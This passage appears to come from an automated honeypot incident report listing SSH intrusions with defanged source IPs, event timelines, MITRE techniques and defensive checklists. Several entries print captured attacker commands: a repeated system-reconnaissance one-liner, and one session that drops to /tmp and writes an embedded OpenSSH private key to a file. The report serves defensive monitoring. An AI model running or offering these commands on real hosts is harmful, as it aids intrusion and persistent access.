| `2026-08-29 17:20:02` | `cowrie.client.version` |
| `2026-08-29 17:20:03` | `cowrie.client.kex` |
| `2026-08-29 17:20:04` | `cowrie.login.success` |
| `2026-08-29 17:20:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.161.113[.]136` to AbuseIPDB if not already reported
- [ ] Block `103.161.113[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8abc7f5a72c5

| Field | Detail |
|---|---|
| **Source IP** | `103.161.113[.]136` |
| **First Seen** | 2026-08-29 17:20 |
| **Last Seen** | 2026-08-29 17:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:20:04` | `cowrie.session.connect` |
| `2026-08-29 17:20:04` | `cowrie.client.version` |
| `2026-08-29 17:20:04` | `cowrie.client.kex` |
| `2026-08-29 17:20:05` | `cowrie.login.success` |
| `2026-08-29 17:20:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.161.113[.]136` to AbuseIPDB if not already reported
- [ ] Block `103.161.113[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a22fc1d8ca1e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 17:20 |
| **Last Seen** | 2026-08-29 17:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:20:49` | `cowrie.session.connect` |
| `2026-08-29 17:20:49` | `cowrie.client.version` |
| `2026-08-29 17:20:49` | `cowrie.client.kex` |
| `2026-08-29 17:20:50` | `cowrie.login.success` |
| `2026-08-29 17:20:50` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:20:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 17:20:50` | `cowrie.direct-tcpip.data` |
| `2026-08-29 17:20:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f08461fc140c

| Field | Detail |
|---|---|
| **Source IP** | `96.56.228[.]149` |
| **First Seen** | 2026-08-29 17:21 |
| **Last Seen** | 2026-08-29 17:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:21:56` | `cowrie.session.connect` |
| `2026-08-29 17:21:56` | `cowrie.client.version` |
| `2026-08-29 17:21:56` | `cowrie.client.kex` |
| `2026-08-29 17:21:57` | `cowrie.login.success` |
| `2026-08-29 17:21:57` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:22:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.56.228[.]149` to AbuseIPDB if not already reported
- [ ] Block `96.56.228[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-221a4f042cd3

| Field | Detail |
|---|---|
| **Source IP** | `70.184.183[.]12` |
| **First Seen** | 2026-08-29 17:22 |
| **Last Seen** | 2026-08-29 17:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:22:02` | `cowrie.session.connect` |
| `2026-08-29 17:22:03` | `cowrie.client.version` |
| `2026-08-29 17:22:03` | `cowrie.client.kex` |
| `2026-08-29 17:22:04` | `cowrie.login.success` |
| `2026-08-29 17:22:04` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.184.183[.]12` to AbuseIPDB if not already reported
- [ ] Block `70.184.183[.]12` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2785c7ca2864

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 17:25 |
| **Last Seen** | 2026-08-29 17:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:25:24` | `cowrie.session.connect` |
| `2026-08-29 17:25:24` | `cowrie.client.version` |
| `2026-08-29 17:25:25` | `cowrie.client.kex` |
| `2026-08-29 17:25:25` | `cowrie.login.success` |
| `2026-08-29 17:25:26` | `cowrie.session.params` |
| `2026-08-29 17:25:26` | `cowrie.command.input` |
| `2026-08-29 17:25:26` | `cowrie.command.input` |
| `2026-08-29 17:25:26` | `cowrie.command.input` |
| `2026-08-29 17:25:26` | `cowrie.command.input` |
| `2026-08-29 17:25:26` | `cowrie.command.input` |
| `2026-08-29 17:25:26` | `cowrie.command.success` |
| `2026-08-29 17:25:26` | `cowrie.command.input` |
| `2026-08-29 17:25:26` | `cowrie.command.input` |
| `2026-08-29 17:25:26` | `cowrie.command.input` |
| `2026-08-29 17:25:26` | `cowrie.command.input` |
| `2026-08-29 17:25:26` | `cowrie.log.closed` |
| `2026-08-29 17:25:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-938d9756c466

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 17:26 |
| **Last Seen** | 2026-08-29 17:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:26:31` | `cowrie.session.connect` |
| `2026-08-29 17:26:31` | `cowrie.client.version` |
| `2026-08-29 17:26:31` | `cowrie.client.kex` |
| `2026-08-29 17:26:32` | `cowrie.login.success` |
| `2026-08-29 17:26:32` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:26:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 17:26:32` | `cowrie.direct-tcpip.data` |
| `2026-08-29 17:26:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-945bf5355950

| Field | Detail |
|---|---|
| **Source IP** | `47.77.182[.]54` |
| **First Seen** | 2026-08-29 17:27 |
| **Last Seen** | 2026-08-29 17:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:27:34` | `cowrie.session.connect` |
| `2026-08-29 17:27:34` | `cowrie.client.version` |
| `2026-08-29 17:27:34` | `cowrie.client.kex` |
| `2026-08-29 17:27:34` | `cowrie.login.success` |
| `2026-08-29 17:27:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.77.182[.]54` to AbuseIPDB if not already reported
- [ ] Block `47.77.182[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b93586adcdc1

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-29 17:27 |
| **Last Seen** | 2026-08-29 17:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:27:35` | `cowrie.session.connect` |
| `2026-08-29 17:27:35` | `cowrie.client.version` |
| `2026-08-29 17:27:35` | `cowrie.client.kex` |
| `2026-08-29 17:27:35` | `cowrie.login.success` |
| `2026-08-29 17:27:37` | `cowrie.session.params` |
| `2026-08-29 17:27:37` | `cowrie.command.input` |
| `2026-08-29 17:27:37` | `cowrie.session.file_download` |
| `2026-08-29 17:27:37` | `cowrie.session.file_download` |
| `2026-08-29 17:27:37` | `cowrie.log.closed` |
| `2026-08-29 17:27:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f6d07066889

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 17:29 |
| **Last Seen** | 2026-08-29 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:29:21` | `cowrie.session.connect` |
| `2026-08-29 17:29:21` | `cowrie.client.version` |
| `2026-08-29 17:29:21` | `cowrie.client.kex` |
| `2026-08-29 17:29:21` | `cowrie.login.success` |
| `2026-08-29 17:29:22` | `cowrie.session.params` |
| `2026-08-29 17:29:22` | `cowrie.command.input` |
| `2026-08-29 17:29:22` | `cowrie.command.input` |
| `2026-08-29 17:29:22` | `cowrie.command.input` |
| `2026-08-29 17:29:22` | `cowrie.command.input` |
| `2026-08-29 17:29:22` | `cowrie.command.input` |
| `2026-08-29 17:29:22` | `cowrie.command.success` |
| `2026-08-29 17:29:22` | `cowrie.command.input` |
| `2026-08-29 17:29:22` | `cowrie.command.input` |
| `2026-08-29 17:29:22` | `cowrie.command.input` |
| `2026-08-29 17:29:22` | `cowrie.command.input` |
| `2026-08-29 17:29:22` | `cowrie.log.closed` |
| `2026-08-29 17:29:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3f197079197

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 17:30 |
| **Last Seen** | 2026-08-29 17:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:30:29` | `cowrie.session.connect` |
| `2026-08-29 17:30:29` | `cowrie.client.version` |
| `2026-08-29 17:30:29` | `cowrie.client.kex` |
| `2026-08-29 17:30:30` | `cowrie.login.success` |
| `2026-08-29 17:30:30` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:30:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 17:30:30` | `cowrie.direct-tcpip.data` |
| `2026-08-29 17:30:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ddcd852da8c

| Field | Detail |
|---|---|
| **Source IP** | `117.248.201[.]39` |
| **First Seen** | 2026-08-29 17:30 |
| **Last Seen** | 2026-08-29 17:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:30:29` | `cowrie.session.connect` |
| `2026-08-29 17:30:29` | `cowrie.client.version` |
| `2026-08-29 17:30:29` | `cowrie.client.kex` |
| `2026-08-29 17:30:31` | `cowrie.login.success` |
| `2026-08-29 17:30:32` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:30:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.248.201[.]39` to AbuseIPDB if not already reported
- [ ] Block `117.248.201[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c19b3010e2ea

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]128` |
| **First Seen** | 2026-08-29 17:30 |
| **Last Seen** | 2026-08-29 17:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:30:37` | `cowrie.session.connect` |
| `2026-08-29 17:30:37` | `cowrie.client.version` |
| `2026-08-29 17:30:37` | `cowrie.client.kex` |
| `2026-08-29 17:30:38` | `cowrie.login.success` |
| `2026-08-29 17:30:39` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:30:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]128` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]128` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7fa37e6e9bd

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 17:35 |
| **Last Seen** | 2026-08-29 17:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:35:00` | `cowrie.session.connect` |
| `2026-08-29 17:35:00` | `cowrie.client.version` |
| `2026-08-29 17:35:00` | `cowrie.client.kex` |
| `2026-08-29 17:35:01` | `cowrie.login.success` |
| `2026-08-29 17:35:02` | `cowrie.session.params` |
| `2026-08-29 17:35:02` | `cowrie.command.input` |
| `2026-08-29 17:35:02` | `cowrie.command.input` |
| `2026-08-29 17:35:02` | `cowrie.command.input` |
| `2026-08-29 17:35:02` | `cowrie.command.input` |
| `2026-08-29 17:35:02` | `cowrie.command.input` |
| `2026-08-29 17:35:02` | `cowrie.command.success` |
| `2026-08-29 17:35:02` | `cowrie.command.input` |
| `2026-08-29 17:35:02` | `cowrie.command.input` |
| `2026-08-29 17:35:02` | `cowrie.command.input` |
| `2026-08-29 17:35:02` | `cowrie.command.input` |
| `2026-08-29 17:35:02` | `cowrie.log.closed` |
| `2026-08-29 17:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd9ebcf16cf2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 17:37 |
| **Last Seen** | 2026-08-29 17:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:37:11` | `cowrie.session.connect` |
| `2026-08-29 17:37:11` | `cowrie.client.version` |
| `2026-08-29 17:37:11` | `cowrie.client.kex` |
| `2026-08-29 17:37:12` | `cowrie.login.success` |
| `2026-08-29 17:37:12` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:37:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 17:37:12` | `cowrie.direct-tcpip.data` |
| `2026-08-29 17:37:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae3a7021580a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 17:39 |
| **Last Seen** | 2026-08-29 17:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:39:46` | `cowrie.session.connect` |
| `2026-08-29 17:39:46` | `cowrie.client.version` |
| `2026-08-29 17:39:46` | `cowrie.client.kex` |
| `2026-08-29 17:39:46` | `cowrie.login.success` |
| `2026-08-29 17:39:47` | `cowrie.session.params` |
| `2026-08-29 17:39:47` | `cowrie.command.input` |
| `2026-08-29 17:39:47` | `cowrie.command.input` |
| `2026-08-29 17:39:47` | `cowrie.command.input` |
| `2026-08-29 17:39:47` | `cowrie.command.input` |
| `2026-08-29 17:39:47` | `cowrie.command.input` |
| `2026-08-29 17:39:47` | `cowrie.command.success` |
| `2026-08-29 17:39:47` | `cowrie.command.input` |
| `2026-08-29 17:39:47` | `cowrie.command.input` |
| `2026-08-29 17:39:47` | `cowrie.command.input` |
| `2026-08-29 17:39:47` | `cowrie.command.input` |
| `2026-08-29 17:39:47` | `cowrie.log.closed` |
| `2026-08-29 17:39:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-749f5b23c16c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 17:39 |
| **Last Seen** | 2026-08-29 17:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:39:50` | `cowrie.session.connect` |
| `2026-08-29 17:39:50` | `cowrie.client.version` |
| `2026-08-29 17:39:50` | `cowrie.client.kex` |
| `2026-08-29 17:39:51` | `cowrie.login.success` |
| `2026-08-29 17:39:51` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:39:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 17:39:51` | `cowrie.direct-tcpip.data` |
| `2026-08-29 17:39:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7779ef46f3f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 17:42 |
| **Last Seen** | 2026-08-29 17:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:42:29` | `cowrie.session.connect` |
| `2026-08-29 17:42:29` | `cowrie.client.version` |
| `2026-08-29 17:42:29` | `cowrie.client.kex` |
| `2026-08-29 17:42:30` | `cowrie.login.success` |
| `2026-08-29 17:42:31` | `cowrie.session.params` |
| `2026-08-29 17:42:31` | `cowrie.command.input` |
| `2026-08-29 17:42:31` | `cowrie.command.input` |
| `2026-08-29 17:42:31` | `cowrie.command.input` |
| `2026-08-29 17:42:31` | `cowrie.command.input` |
| `2026-08-29 17:42:31` | `cowrie.command.input` |
| `2026-08-29 17:42:31` | `cowrie.command.success` |
| `2026-08-29 17:42:31` | `cowrie.command.input` |
| `2026-08-29 17:42:31` | `cowrie.command.input` |
| `2026-08-29 17:42:31` | `cowrie.command.input` |
| `2026-08-29 17:42:31` | `cowrie.command.input` |
| `2026-08-29 17:42:31` | `cowrie.log.closed` |
| `2026-08-29 17:42:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2999500d19d8

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 17:45 |
| **Last Seen** | 2026-08-29 17:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:45:13` | `cowrie.session.connect` |
| `2026-08-29 17:45:13` | `cowrie.client.version` |
| `2026-08-29 17:45:13` | `cowrie.client.kex` |
| `2026-08-29 17:45:13` | `cowrie.login.success` |
